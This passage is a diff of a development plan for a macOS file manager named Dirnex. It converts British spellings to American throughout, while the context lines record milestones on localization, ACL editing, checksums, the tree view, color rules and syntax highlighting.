 the item still in the Trash; deleting the origin folder entirely and retrying **recreated** it and
 restored the file under its *original* name (proving `ptbN`); a folder came back with its contents;
 and both home-trash items — one trashed by the API, one by Finder, i.e. both recorded path forms —
-returned to the same real folder. Restore All's sheet counted the listing exactly; Put Back greys out
+returned to the same real folder. Restore All's sheet counted the listing exactly; Put Back grays out
 in an ordinary directory.
 
 ### M9 — iCloud Drive, for real (M)
@@ -5520,7 +5520,7 @@ file with its contents intact. Four decisions the checklist didn't pre-answer:
   `.unsupported` by default. Creating an empty file touches bytes, so §2 puts it in the core with
   tests; `O_EXCL` is what makes ⇧F4 safe on a name the user typed — the stat-then-create race
   would otherwise truncate a document on the way to opening it.
-- **"Inert on a folder" is a *greyed* menu item, not a swallowed keystroke.** The first cut left
+- **"Inert on a folder" is a *grayed* menu item, not a swallowed keystroke.** The first cut left
   F4 enabled with a folder under the cursor and doing nothing — caught in the built app, not by a
   test. Enabled now means exactly "the key does something": a local file, or nothing under the
   cursor at all (where F4 becomes ⇧F4's dialog).
@@ -5544,7 +5544,7 @@ file with its contents intact. Four decisions the checklist didn't pre-answer:
 wrong one for reading a contract or looking at a photograph. This gives it two larger sizes
 without giving it a second implementation: the existing overlay already *covers* the file
 list rather than hiding it, so the active pane's table keeps first responder and the cursor
-keeps driving the preview at any size. Every behaviour the panel has — cursor tracking, Tab
+keeps driving the preview at any size. Every behavior the panel has — cursor tracking, Tab
 to swap which pane is the source, on-demand archive-member extraction, the `PDFView` route
 for multi-page PDFs, Esc — transfers for free because none of it knows how big the preview is.
 
@@ -5557,7 +5557,7 @@ the native full-screen space, black backing, nothing on screen but the photo.
       (the `NSBox` backing, the lazy `QLPreviewView(.compact)`, the lazy `PDFView`, the
       content-type routing between them) come out of `PanelViewController+QuickView` into a
       standalone view. The pane keeps one pinned over its scroll view; each new mode hosts an
-      identical one at a different anchor. A pure refactor with no behaviour change, and the
+      identical one at a different anchor. A pure refactor with no behavior change, and the
       thing that keeps this slice from being three copies of one preview.
 - [x] **A mode, not a Bool** — `isQuickViewOn` becomes
       `QuickViewMode { off, pane, fullWindow, fullScreen }` on the window controller, which
@@ -5654,7 +5654,7 @@ counts as horizontal, how to compensate for acceleration, when the user has chan
 how to animate the remaining travel after the fingers lift. The handler now decides *which file* and
 nothing else, so the feel is the platform's and matches every other app on the machine. `SwipeStepper`
 and its 23 tests were **deleted**: not because the tests were wrong, but because the thing they
-pinned should never have been ours to decide. Dirnex honours
+pinned should never have been ours to decide. Dirnex honors
 `NSEvent.isSwipeTrackingFromScrollEventsEnabled` rather than substituting its own gesture — a user
 who has turned "Swipe between pages" off has said what they want, and ← / → still walk the list.
 
@@ -5693,7 +5693,7 @@ remaining literal, and the twelve further languages. **Fourteen languages ship**
 Deutsch · Español · Français · Italiano · 日本語 · 한국어 · Nederlands · Polski · Português (Brasil) ·
 Русский · Українська · 简体中文 · 繁體中文 — each with a complete `Localizable` column (802 keys,
 plural variants included) and both App Shortcut phrases, enforced by `LocalizationCoverageTests`. No
-RTL in the shipped set. Four of the fourteen are CJK, so the input-method behaviour of the inline
+RTL in the shipped set. Four of the fourteen are CJK, so the input-method behavior of the inline
 rename field and the palette is a live check none of the passes below records running.
 
 **Pass 1 — plumbing (2026-07-22, landed).** Auto-selection from the system language, an in-app
@@ -5916,7 +5916,7 @@ for it.
 - **Slice 9 landed (2026-07-23): the remaining Browser controllers.** The last bare status/tooltip
   strings across `Dirnex/Browser/` — the Find Files sheet (`SearchController`: field labels, the
   kind/size/date/scope popups, placeholders, Find/Cancel), the Save Search and Replace dialogs, the
-  New Tag dialog and its colour popup, the tag menu (New Tag… / Remove All Tags) and tag-change
+  New Tag dialog and its color popup, the tag menu (New Tag… / Remove All Tags) and tag-change
   failure, the Favorites ⌃D menu (No Pinned Folders / Add·Remove Current Folder / missing-favorite
   alert), the terminal-launch failure, the iCloud download sheet, the inline-rename validation and
   failure alerts, the search-results truncation alert, and the window-controller tooltips (Toggle
@@ -5925,11 +5925,11 @@ for it.
   `Recents`, `Trash`, `Results for %@`, and several more). **Three `DirnexCore` data enums got the
   registry treatment** (like `SidebarSection`): `SearchKind`/`SearchAge`/`FinderTagColor` `.title`
   reach the popups through a variable, so `LocalizationKey.searchKind/searchAge/tagColor` key them
-  (the last by a switch-derived stable token, not its `Int` raw value, so the catalog reads as colour
+  (the last by a switch-derived stable token, not its `Int` raw value, so the catalog reads as color
   names), `LocalizedCatalog.title(for:)` joins them, and `LocalizationCoverageTests` now fails on an
-  untranslated kind/age/colour (18 symbolic keys). Recurring traps fixed at the source: the
+  untranslated kind/age/color (18 symbolic keys). Recurring traps fixed at the source: the
   **`+`-concatenation trap** in the iCloud download body (`"a " + "b"` → one literal), and the New Tag
-  dialog's `colour` popup built its titles from `color.title` (a variable) — the exact reason the
+  dialog's `color` popup built its titles from `color.title` (a variable) — the exact reason the
   registry treatment exists. **Two things only the live Russian run caught, both after a *second*,
   wider scan:** the first pattern-based sweep missed every **multi-line `NSMenuItem(title:` / menu
   constructor** (the Favorites and tag menu items sat bare), and the **Recents virtual tab leaked
@@ -5940,10 +5940,10 @@ for it.
   the identity to draw "Недавние" with the sidebar's `clock` glyph — the same lesson as the Trash,
   that a *place you visit* must name itself rather than read as a search someone ran. The stock tag
   *names* in the ⌃T menu (Red/Orange/…) stay English on purpose — they are `FinderTag.systemTagName`
-  data, a separate core concern, not the colour titles. Keys taken from the compiler-emitted
+  data, a separate core concern, not the color titles. Keys taken from the compiler-emitted
   `.stringsdata`, added by script with an exact-match guard, verified additive-only (68 added, 0
   changed). Verified live in Russian: the whole Find Files sheet with all four popups, the Favorites
-  and tag menus, the New Tag dialog and its eight colour names (Без цвета · Серый · … · Оранжевый),
+  and tag menus, the New Tag dialog and its eight color names (Без цвета · Серый · … · Оранжевый),
   and the Recents self-naming; the awkward-to-provoke alerts were checked through the compiled
   `ru.lproj`.
 - **Slice 10 landed (2026-07-23): the undo/redo action labels — the last piece of Pass 2.** The
@@ -6024,9 +6024,9 @@ for it.
   - Keys added by script with the usual exact-match guard against the emitted `.stringsdata` and an
     additive-only check (50 added, 0 changed), and `Couldn’t mount the share (error %d).` was taken
     verbatim from it — the errno is an `Int32`, so the specifier is `%d`, not `%lld`.
-- **Slice 12 landed (2026-07-24): the completeness audit, and the first *behavioural* leak.** A
+- **Slice 12 landed (2026-07-24): the completeness audit, and the first *behavioral* leak.** A
   full re-run of Slice 11's sweep over the app and the core, cross-checked both ways against the
-  compiler-emitted `.stringsdata` (extracted-but-uncatalogued *and* catalogued-but-unused), plus a
+  compiler-emitted `.stringsdata` (extracted-but-uncataloged *and* cataloged-but-unused), plus a
   scan for bare literals at AppKit display sinks. The catalog itself came back clean — 726 keys, `en`
   and `ru` complete, no blanks — and the extracted-but-untranslated set was **exactly** the 21 App
   Intents keys already deferred, so Slices 1–11 held. Six leaks remained; **6 new catalog keys**
@@ -6048,7 +6048,7 @@ for it.
     tested precedence, and `LocalizedCatalog.summary(of:)`/`.plainName(of:)` pick the words. The
     display quotes became a `“%@”` format so Russian can answer `«%@»`.
   - **`NSAlert`'s Escape binding is English-only, which made this the first leak that changed
-    *behaviour* rather than pixels** — see NOTES.md for the probe and the two live bugs it turned up.
+    *behavior* rather than pixels** — see NOTES.md for the probe and the two live bugs it turned up.
     `enableEscapeToCancel(safe:)` now takes an `NSApplication.ModalResponse` instead of matching
     titles, and `EscapeToDismissTests` pins it with cases carrying no English word anywhere.
   - Keys added by script with the usual exact-match guard against the emitted `.stringsdata` and an
@@ -6092,7 +6092,7 @@ for it.
     said so in a comment — `pathSummary` is a stable English *identity*, the `title` is what's shown
     and localizes — and iCloud used the same constant for both. Invisible in Russian, where Apple
     keeps the product name; it would surface the first time a language transliterates it.
-  - The extracted-vs-catalogued diff over every `.stringsdata` now comes back **clean**, with one
+  - The extracted-vs-cataloged diff over every `.stringsdata` now comes back **clean**, with one
     deliberate survivor: `DisplayRepresentation(title: "\(name)")` in `DirnexOperationEntity` extracts
     `%@` because both arguments are already localized upstream. That is the shape the `noWindow` bug
     wore, so it is worth knowing which instances are legitimate.
@@ -6251,7 +6251,7 @@ what the wire actually does.
 - [x] `FTPBackend` over an injected `FTPTransport`: browse, byte transfer with resume, remote mkdir /
       rename / delete, all through the standard queue. Capabilities are `[.read, .write, .rename]` —
       no `.trash`, no `.clone`, no `.watch` — so `deleteStrategy` resolves to `.permanent` and the M5
-      degradation path (grey-out + Trash-less confirmed-permanent-delete) lights up with no new UI.
+      degradation path (gray-out + Trash-less confirmed-permanent-delete) lights up with no new UI.
       No `.watch` means no live refresh: refresh-on-focus and manual refresh, exactly as SFTP does.
 - [x] **Plain FTP, FTPS-explicit (`AUTH TLS` on port 21) and FTPS-implicit (port 990)**, plus
       **anonymous** login. Both extras are in scope rather than deferred because both are nearly free:
@@ -6693,7 +6693,7 @@ style (now natively produced on macOS too), with `.sfv` for CRC32.
 #### Slice 1 — checksum core (additive, app untouched)
 
 - `ChecksumAlgorithm` — `crc32 · md5 · sha1 · sha256`, carrying display name, digest width and
-  canonical file extension as data. SHA-256 is the default; the other three are labelled as
+  canonical file extension as data. SHA-256 is the default; the other three are labeled as
   interop formats and the UI must never imply MD5 or SHA-1 is a security property.
 - `CRC32` — table-driven, with the published vector as its first test (`"123456789"` →
   `0xCBF43926`, already confirmed in the probe). No zlib dependency for one function. If its
@@ -6790,7 +6790,7 @@ and `allowDataless` is the same escape hatch under the same name.
 shape, split into `ChecksumCreateRun` / `ChecksumVerifyRun` / `ChecksumRunContext` at the lint
 ceiling by concept, not by shaving. `FileOperation.Kind` grew its first case beyond `.copy`/`.move`
 (a `.checksum` kind carrying the report payload, with its `QueueSnapshot` status strings). App: the
-two commands in File as *Create Checksum File…* and *Verify Checksums…*, the report sheet modelled
+two commands in File as *Create Checksum File…* and *Verify Checksums…*, the report sheet modeled
 on the Sync diff table, and 40 extracted literals + the registry and `ChecksumError` keys across all
 13 languages, with `LocalizationErrorCoverageTests` added. 1319 core tests, both suites green, both
 linters clean.
@@ -6802,10 +6802,10 @@ linters clean.
 - **The report has four verdicts and each was forced live.** `verified` → green "Everything checks
   out"; `mismatch` → red ✗ "Doesn't match — expected <hex>…" (the *expected* digest, from the
   manifest); `missing` → amber ? "Not in this folder"; and an *unlisted* file present on disk but
-  absent from the manifest → grey + "Here, but not in the checksum file", with directories and the
+  absent from the manifest → gray + "Here, but not in the checksum file", with directories and the
   manifest file itself correctly excluded from that scan. The header flips red the moment any entry
   fails or goes missing; extras alone keep it green, since an unlisted file is an FYI, not a failure.
-- **Verify's menu item gates on a manifest being the cursor row**, greyed otherwise — validated
+- **Verify's menu item gates on a manifest being the cursor row**, grayed otherwise — validated
   live by watching it enable only once `sub.sha256` was selected.
 - **The dataless gate was retrofitted to the runner** (the Slice-1 follow-on's "worth doing in Slice
   2"), so a verify over a tree refuses the first placeholder and a pointed-at file asks — the
@@ -6832,10 +6832,10 @@ linters clean.
   entries are marked as such. The parse/serialize pair is the testable core; a captured real ACL
   from a real file is the fixture, per §"Working rhythm".
 - The **rights set is a function of item kind** (12 for a file, 17 for a directory), so it is
-  modelled as such rather than as one flat option set — the compiler then prevents offering
+  modeled as such rather than as one flat option set — the compiler then prevents offering
   `add_subdirectory` on a file.
 - `AttributePrivilege` — pure, from the probed matrix: given an entry's owner and the requested
-  diff, does this need root? It is what greys the panel and decides whether Slice 5 is reachable
+  diff, does this need root? It is what grays the panel and decides whether Slice 5 is reachable
   at all, and it is a table, so it is a test.
 
 **Slice 3 landed (2026-07-30), as designed, plus what a fresh probe changed.** Twelve core files —
@@ -6852,7 +6852,7 @@ change compiles.
   bits the kernel prints with their file names even on a directory (`list`≡`read`, `add_file`≡`write`,
   `search`≡`execute`, `add_subdirectory`≡`append`), so the parser only ever sees
   `read/write/execute/append` and the model is the **13 canonical bits**, not `chmod(1)`'s 17 input
-  tokens — the "17 for a directory" is 13 rights relabelled per kind + 4 inheritance flags. And the
+  tokens — the "17 for a directory" is 13 rights relabeled per kind + 4 inheritance flags. And the
   canonical form `acl_from_text` accepts needs **GUID + name + numeric id**, all three.
 - **Order is proven live in both directions, which is the exit criterion.** An ACL Dirnex writes
   reads back — through `acl_get_file` *and* `ls -le` — with deny-before-allow in the order written;
@@ -6946,7 +6946,7 @@ catalog keys across all 14 languages.
 - **The ACL exit criterion is met in the order that matters.** `ls -le`'s `0: group:staff deny
   delete` / `1: group:everyone allow read,readattr` renders as rows 1 and 2 in that order, deny in
   red. On the directory, `list,search,file_inherit,directory_inherit` renders as "List, Traverse —
-  files inherit, folders inherit", so the four aliased bits are relabelled per kind exactly as
+  files inherit, folders inherit", so the four aliased bits are relabeled per kind exactly as
   `ls -le` spells them.
 - **The mode-vs-ACL criterion is met too**: whenever an ACL is present the Permissions tab says so
   in orange and points at the Sharing tab, because an ACL does not change the mode and the nine
@@ -7021,7 +7021,7 @@ whatever the item is in now. All three dates are editable, through the plan that
   three fields differ the instant the sheet opens — Save enabled with nothing edited, and a `utimes`
   on commit for three dates nobody touched. `DateField.initial` holds what the control was *given*,
   which is what makes "untouched" mean untouched at the control's granularity. Verified live: the
-  sheet opens with Save greyed.
+  sheet opens with Save grayed.
 - The root-only alert now builds its sentence from the reason the core gave rather than assuming the
   system-flag case — four whole sentences, not one frame with a clause spliced in, because a clause's
   grammar depends on the sentence around it. That is the seam Slice 5 escalates from.
@@ -7042,7 +7042,7 @@ languages. 1449 core tests and 161 app tests green, both linters clean.
   `AttributesSnapshot` degrades a failed ACL read to an empty list, so the tab said "No access
   control list" — wrong in the quiet direction, on the one tab whose job is that answer. Both are
   accepted back by `acl_from_text`, so `ACLSubject.numericID` became optional and both now round-trip
-  losslessly, which is what keeps an edit to a *neighbouring* entry from rewriting them.
+  losslessly, which is what keeps an edit to a *neighboring* entry from rewriting them.
 - **`acl_set_file` is `EPERM` on a `UF_IMMUTABLE` file exactly as `chmod` is**, so the ACL is a step
   *inside* the existing unlock → apply → relock window rather than a second write beside it. The two
   halves are otherwise independent — `chmod`/`chgrp`/`utimes` each leave an ACL intact and in order,
@@ -7058,11 +7058,11 @@ languages. 1449 core tests and 161 app tests green, both linters clean.
 - **An entry with no rights is a real state that decides nothing**, and the probe is what showed it:
   `acl_from_text` accepts an empty rights field and `ls -le` shows `0: group:staff allow`. The editor
   displays such an entry ("Nothing — this entry has no effect") and refuses to write one — Save stays
-  greyed even though the list changed, verified live.
-- **Inherited entries are shown exactly as they apply and not edited in place** — greyed row, subject
+  grayed even though the list changed, verified live.
+- **Inherited entries are shown exactly as they apply and not edited in place** — grayed row, subject
   and rights disabled, a note explaining where they came from, and **remove** still available, since
   dropping an inherited entry from this item is the user's call. Writing a list back preserves the
-  `inherited` marker verbatim (probed), so editing a neighbour never silently forks one from its
+  `inherited` marker verbatim (probed), so editing a neighbor never silently forks one from its
   parent.
 - **The rights matrix was laid out from a measurement, not from the English.** Three columns need
   506 pt against 410 — English itself clipped "Execute" — and two columns in 410 overflow Russian at
@@ -7228,7 +7228,7 @@ deliberately — the flat single-item path is where the mechanism proves out.
   named, never dropped** (decided with Oleg). `chflags` is *additive* (probed), so each flags step is a
   minimal `keyword`/`nokeyword` delta against the word on disk at that point; `touch -t` is
   whole-second (which is the `NSDatePicker`'s own resolution) and only the *changed* time is touched, so
-  an untouched neighbour keeps its sub-second value; `chmod +a#` reproduces an *exact ordered* ACL, and
+  an untouched neighbor keeps its sub-second value; `chmod +a#` reproduces an *exact ordered* ACL, and
   the canonical `read/write/execute/append` spelling is accepted verbatim on a directory (chmod
   relabels it to `list/add_file/…` itself). The two omissions: the **Created date** (no stock tool sets
   the birth time without Xcode) and an **ACL `chmod` cannot express** (an inherited entry, an
@@ -7286,7 +7286,7 @@ unreachable — it would only fire in the rare state where the other pane's curs
 convention rather than a second selection rule.
 
 **A marked pair the tool can't take is refused, not quietly replaced.** Mark two folders and the
-command greys out; falling through would hand FileMerge two unrelated cursor files with nothing on
+command grays out; falling through would hand FileMerge two unrelated cursor files with nothing on
 screen saying the marks were ignored — wrong in the quiet direction, on a gesture whose whole point
 is "these two". Order inside a pane is **display order**, the in-pane reading of the
 physical-left-pane rule the cross-pane path has followed since the 2026-07-20 UX pass: the upper row
@@ -7304,10 +7304,10 @@ one can only mean the marks were declined. Verified live on the real binary with
 cursor deliberately on a folder — so nothing but the marks could have produced an answer: differing
 pair → FileMerge opened "one.txt vs. two.txt" with the upper row in the left column; identical pair
 → "Files are identical — nothing to compare." on the status line and no FileMerge in the process
-table; file + folder → the menu item grey. 1537 core + app tests green, swiftformat + swiftlint
+table; file + folder → the menu item gray. 1537 core + app tests green, swiftformat + swiftlint
 --strict clean. The failure detail now names both gestures, translated into all 14 languages.
 
-### M15 — The tree view, and colour the user chooses (M)
+### M15 — The tree view, and color the user chooses (M)
 
 Goal: the file list gets a second *shape* and a palette the user owns. Everything through M14 decided
 what a pane shows; this decided how it looks and how deep it reaches. Opened and closed 2026-08-02.
@@ -7354,18 +7354,18 @@ system font is exactly 16.00 pt (bold included — a marked row draws bold). So 
 
 #### Slice 2 — A palette the user owns (S–M) — landed 2026-08-02
 
-Three colours, each defaulting to **Follow System**, so an untouched install renders exactly as it
+Three colors, each defaulting to **Follow System**, so an untouched install renders exactly as it
 did before the slice and the default path stays AppKit's own drawing:
 
 - [x] **Accent** — overrides `.controlAccentColor` at the path bar, the tab chips and the update
       indicator. Framed in Settings as an override, because macOS already ships this control
       (System Settings ▸ Appearance ▸ Accent) and `.controlAccentColor` already follows it.
 - [x] **Cursor** — the row background. The sharp one: AppKit draws the emphasized selection, so a
-      custom colour needs an `NSTableRowView` subclass that draws its own. **Probed, and the answer
+      custom color needs an `NSTableRowView` subclass that draws its own. **Probed, and the answer
       simplified the plan:** when the delegate declines to supply a row view, `NSTableView` makes a
       plain `NSTableRowView` — in every one of its five styles — so a subclass that hands the call
       to `super` is byte-for-byte the shipped drawing, and `PanelRowView` is installed
-      *unconditionally* rather than only when a colour is set. Switching classes as the preference
+      *unconditionally* rather than only when a color is set. Switching classes as the preference
       changes would leave a reuse pool of the other kind to reason about; deferring leaves nothing
       to get wrong.
 - [x] **Mark** — the hardcoded `.systemRed` in `FileCellView`. Unlike the selection blue this one
@@ -7374,64 +7374,64 @@ did before the slice and the default path stays AppKit's own drawing:
 - [x] Two sites assumed the system blue and now take a **derived** foreground instead:
       `FileCellView.applyStyle`'s `.alternateSelectedControlTextColor`, and `SizeBarView`'s
       `isEmphasized` branch, whose own comment named it as the only fill that survives the blue.
-      Derived by luminance — never let the user pick the foreground, or the first custom colour
+      Derived by luminance — never let the user pick the foreground, or the first custom color
       makes the cursor row unreadable. **The rule is "white unless it drops below 3:1", not
       "whichever contrasts more"**, and the measurement is what settled it: `.controlAccentColor`
       is L=0.2114, where white scores 4.02:1 and black 5.23:1 — so maximum contrast picks *black*,
       while macOS and Dirnex's own tab chip draw white. See NOTES.md ▸ AppKit.
-- [x] Keep the emphasized/unemphasized split. NOTES.md ▸ AppKit: grey-versus-blue is AppKit saying
+- [x] Keep the emphasized/unemphasized split. NOTES.md ▸ AppKit: gray-versus-blue is AppKit saying
       the focus moved, and it is the signal the *rows themselves* carry (the path bar and tab chips
       say it separately, via `updateActiveAppearance`). Flatten the two and both panes' cursors look
       identical, which reads as permanently unfocused. Measured, the unemphasized selection is a
-      *pure grey* in both appearances (`#DCDCDC` / `#464646`, zero saturation) and in dark mode is
+      *pure gray* in both appearances (`#DCDCDC` / `#464646`, zero saturation) and in dark mode is
       **darker** than the emphasized fill rather than fainter — so there is nothing to derive, and
       only the emphasized half is drawn here.
 
-Deliberately not themable: Finder tag dots (they have to match Finder's own colours), git status
-colours, sync badges. Those are information, not decoration. All of it is presentation and lives
+Deliberately not themable: Finder tag dots (they have to match Finder's own colors), git status
+colors, sync badges. Those are information, not decoration. All of it is presentation and lives
 in the **app**, not the core (NOTES.md ▸ Localization: a presentation decision in the core is a
 string that can never be translated — the general form is that the core picks the state and the app
-picks the pixels), tested in `DirnexTests` the way `SyncBadgeTests` already is. Colours persist as
+picks the pixels), tested in `DirnexTests` the way `SyncBadgeTests` already is. Colors persist as
 hex in `UserDefaults`, per §2's "boring and debuggable".
 
-Exit: a non-default cursor colour renders legibly in both appearances, the inactive pane still reads
+Exit: a non-default cursor color renders legibly in both appearances, the inactive pane still reads
 as inactive, and Follow System restores byte-identical rendering. **Met** — verified live against
 the real binary with a deliberately pale cursor (`#FFD60A`): the name, size, date, the ncdu bar, its
 track and its percentage all flipped to black on it, a marked row under the cursor stayed bold and
-legible, the inactive pane kept AppKit's grey, and Settings ▸ Use System Colours restored the blue
+legible, the inactive pane kept AppKit's gray, and Settings ▸ Use System Colors restored the blue
 cursor, the blue crumb, the white-on-blue chip and the titlebar indicator live, without a relaunch.
 Legibility in the *other* appearance is a claim no single screenshot can make, so it is pinned by
-construction instead: the derivation is a luminance test over the user's own sRGB colour, measured
+construction instead: the derivation is a luminance test over the user's own sRGB color, measured
 identical under `.aqua` and `.darkAqua` and asserted in `PanelPaletteTests`.
 
 `PathBarView` hit SwiftLint's 500-line ceiling in this slice and was split by *concept* rather than
 shaved (CLAUDE.md ▸ file splitting): `PathBarView+Editing` takes the Cmd+L text field, its
 completion cache and the `NSTextFieldDelegate` conformance, leaving the crumb row behind.
 
-#### Slice 3 — Colour rules by file type (M) — landed 2026-08-02
+#### Slice 3 — Color rules by file type (M) — landed 2026-08-02
 
-Total Commander's signature: an ordered list of glob → colour rules, first match wins. Order is
+Total Commander's signature: an ordered list of glob → color rules, first match wins. Order is
 meaning, so the list is never silently canonicalized — the same rule an ACL's entry order follows.
 
 - [x] Core: `FileColorRule` + `FileColorRules.firstMatch(for:)`, pure and tested, over the same
-      `Glob` that `+`/`-` pattern select already uses. The colour rides as user *data* (hex), not as
-      a decision the core authored — the `FinderTag` split, where the core carries the colour and
+      `Glob` that `+`/`-` pattern select already uses. The color rides as user *data* (hex), not as
+      a decision the core authored — the `FinderTag` split, where the core carries the color and
       the app maps it to pixels. Two additions the plan didn't name, each because the shipped
       alternative is unwritable rather than merely inconvenient: a rule holds **several patterns**
-      (`*.jpg;*.png` is one "Images" rule with one colour), split on `;` and *not* on whitespace as
+      (`*.jpg;*.png` is one "Images" rule with one color), split on `;` and *not* on whitespace as
       TC does — a file name may contain a space, so space-splitting makes `My Photo*.jpg`
-      unexpressible; and a rule carries a **target** (files / folders / both), because "colour every
+      unexpressible; and a rule carries a **target** (files / folders / both), because "color every
       folder" is among the first things a TC user reaches for and a name glob cannot say it —
       `*` would take every file along with it.
 - [x] Precedence, made explicit rather than reusing the existing slot: `FileCellView.accentColor`
-      *outranked* the mark (a marked modified file still shows its orange git `M`), and a type colour
+      *outranked* the mark (a marked modified file still shows its orange git `M`), and a type color
       has to rank **below** it — a marked file must stay unmistakably marked. Resolution is now
-      git status → mark → type rule → label colour.
+      git status → mark → type rule → label color.
 - [x] Settings editor: add / remove / reorder with a live preview row, stored beside the user
       scripts. Reorder is explicit ▲/▼ buttons, not drag alone — it is the control that decides
       *which rule wins*, so it has to be reachable from the keyboard and be something you do rather
       than discover. The live preview is the row itself: the rule's name draws in the rule's own
-      colour, so an unreadable choice is visible where it is made rather than only out in the pane.
+      color, so an unreadable choice is visible where it is made rather than only out in the pane.
 
 **Measured before writing any of it, and it settled two decisions.** `fnmatch` costs **263 ns** a
 call, and that is the call itself — `String`→C bridging adds ~3 ns and `Glob`'s case-folding ~84 —
@@ -7441,19 +7441,19 @@ over a 60-row screen, worst case, an empty list is free, 5 rules × 2 patterns c
 reload and 20 × 3 cost 2.44 ms, against 0.10 / 0.53 ms for a memo — affordable next to a reload that
 already builds 240 views and looks up an icon per row. The second: a **malformed pattern matches
 nothing**, because `fnmatch` answers its error code (2) rather than `FNM_NOMATCH` for `[`, `[a-` and
-a lone `\`, and `Glob` tests for `== 0` — so a half-typed `[` in the live editor colours nothing
+a lone `\`, and `Glob` tests for `== 0` — so a half-typed `[` in the live editor colors nothing
 while the user keeps typing, instead of flooding the pane.
 
 Exit: `*.jpg` draws teal in both panes and survives relaunch; a marked `.jpg` still reads as marked;
 a modified `.jpg` inside a repository still shows its git letter. **Met** — verified live against the
-real binary, driving the real Settings editor: a `*.png` rule recoloured six files in both panes
+real binary, driving the real Settings editor: a `*.png` rule recolored six files in both panes
 while it was still being typed and came back after a quit/relaunch; the marked `.png` stayed bold red
-and the cursor row stayed white-on-blue, so both outrank the type colour; and in this repository
+and the cursor row stayed white-on-blue, so both outrank the type color; and in this repository
 `FileCellView.swift` kept its orange `M` and `FileColorRuleStore.swift` its green `?` while name,
-size and date drew in the rule's colour. Also verified, beyond the stated exit: a folders-only `*`
-coloured the folders while leaving files whose name it matches alone (the target gate, and the
+size and date drew in the rule's color. Also verified, beyond the stated exit: a folders-only `*`
+colored the folders while leaving files whose name it matches alone (the target gate, and the
 fall-through when it rejects), ▲/▼ moved a general rule above a specific one and the whole pane
-followed first-match-wins in both directions, the `..` row never takes a colour, and deleting the
+followed first-match-wins in both directions, the `..` row never takes a color, and deleting the
 rules restored the shipped rendering exactly.
 
 One bug found only by launching, in the class NOTES.md ▸ Localization already collects: **a SwiftUI
@@ -7514,7 +7514,7 @@ included.
       indentation + disclosure chevron, the `→`/`←` keys, per-tab persisted expansion, the one
       multi-path watcher, a `Tree View` command in the View menu (translated into all 14 languages),
       and the two fork points answered: the size bars are **withdrawn** in tree mode (a level's
-      siblings are not the row's neighbours), and every tree refresh keeps the
+      siblings are not the row's neighbors), and every tree refresh keeps the
       `installSortedModel` → `reloadEverything` → `syncCursorToTable(scroll: false)` tail.
 - [x] **Operation semantics landed 2026-08-02** — `TreeSelection` in the core (18 tests):
       `transferGroups(_:relativeTo:)` groups a marked set by each item's path relative to the pane's
@@ -7543,7 +7543,7 @@ cursor-restore through it and `displayedEntry(at:)`. Written up in NOTES.md ▸ 
 
 Both are operation semantics, not view work, which is why they could not be deferred into it:
 
-1. **What F5/F6 do with marks spanning levels.** *Settled: TC's branch-view behaviour* — flatten
+1. **What F5/F6 do with marks spanning levels.** *Settled: TC's branch-view behavior* — flatten
    *preserving relative paths* under the destination. Copying everything flat into one folder is the
    alternative and it silently collides the moment two folders hold an `x.jpg`.
 2. **F8 with an ancestor and its descendant both marked.** *Settled: dedupe to the ancestor* before
@@ -7595,7 +7595,7 @@ itself stays in PLAN.md §6 — the projection is the mitigation, and it is stil
 against whenever a tree-only path is proposed.
 
 **Localization:** M12's rhythm holds — each slice shipped its own catalog keys, so the `Tree View`
-command, the density picker, the three colour wells and the colour-rules editor were translated into
+command, the density picker, the three color wells and the color-rules editor were translated into
 all 14 languages in the slice that added them, with `LocalizationCoverageTests` failing on an
 untranslated command in any of them.
 
@@ -7811,7 +7811,7 @@ Closed with **1678 core + 229 app tests green** (157 and 43 suites), `swiftforma
 
 ### M17 — Syntax highlighting in Quick View (S–M)
 
-Goal: the text preview stops being one colour. M11 gave Quick View its own in-process text view so
+Goal: the text preview stops being one color. M11 gave Quick View its own in-process text view so
 the user could select and copy; M16 made **source** the default rendering for a file that has two.
 Both decisions point here — a file manager that shows you the file should show it the way an editor
 would. Opened 2026-08-06.
@@ -7866,22 +7866,22 @@ Exit: a Swift file, a `Makefile`, a `.json` and a `.sql` each tokenize as expect
 in the app has changed and it does not need a rebuild. **Met** — 37 new tests (1715 core, app suite
 green, both linters clean), the app target untouched.
 
-Six languages went beyond the table and into a **throwaway ANSI-colour probe over this repo's own
+Six languages went beyond the table and into a **throwaway ANSI-color probe over this repo's own
 files**, which is what the working rhythm buys here: the scan can be *read* rather than trusted, and
 three things came out of it that no unit test would have been written for.
 
 - **`prefix` and `postfix` are out of the Swift keyword set.** Both are contextual — they mean
   something only before `func` or `operator` — and `prefix` is one of the most common method names in
-  the language: `data.prefix(n)` came back coloured as a keyword on three lines of `TextPreview.swift`
+  the language: `data.prefix(n)` came back colored as a keyword on three lines of `TextPreview.swift`
   alone. A scanner with no parser cannot tell the two apart, and the false positive is louder than the
-  word it colours. The general shape, and the first live instance of the milestone's own escape hatch:
-  **the honest fix for a construct a scanner gets wrong is to stop colouring it.**
+  word it colors. The general shape, and the first live instance of the milestone's own escape hatch:
+  **the honest fix for a construct a scanner gets wrong is to stop coloring it.**
 - **`.xcstrings` is JSON, not XML.** Slice 2's bullet lists it with the markup family; probed against
   this repo's own catalogs, they open `{ "sourceLanguage": … }`. It routes to `json` and Slice 2 keeps
   four extensions, not five.
 - **A `.h` takes the *union* of C++ and Objective-C**, rather than a guess between three dialects.
   `UTType` says `public.c-header` and no more — which is the whole reason the routing is
-  extension-first — so `cHeader` merges the keyword sets and keeps `@`. A word coloured that a dialect
+  extension-first — so `cHeader` merges the keyword sets and keeps `@`. A word colored that a dialect
   never uses is invisible in the files that do not use it; picking one dialect leaves `class` or
   `@interface` flat in the other two.
 
@@ -7920,10 +7920,10 @@ Three decisions, each of which changed something already written:
 
 - **`SyntaxToken.Kind` grew by two — `.inserted` and `.deleted`.** "Six and no more" was written
   against a *theme* question (§7: how much the user owns — still "none"), and these are two more
-  entries in the same system-colour dictionary, not a Settings surface. The alternative was to borrow
+  entries in the same system-color dictionary, not a Settings surface. The alternative was to borrow
   `.comment` for an added line and `.string` for a removed one, which renders correctly against the
-  colours Slice 3 will likely pick and **couples the diff to a decision about something else**: the
-  day `.comment` becomes grey, as many themes have it, a diff silently loses its green and nothing in
+  colors Slice 3 will likely pick and **couples the diff to a decision about something else**: the
+  day `.comment` becomes gray, as many themes have it, a diff silently loses its green and nothing in
   the code says why.
 - **`SyntaxLanguage.grammar` is now optional, behind an internal `Scanning` enum.** The obvious
   shape — an optional grammar plus a second switch for the three scanner-backed cases — needs a
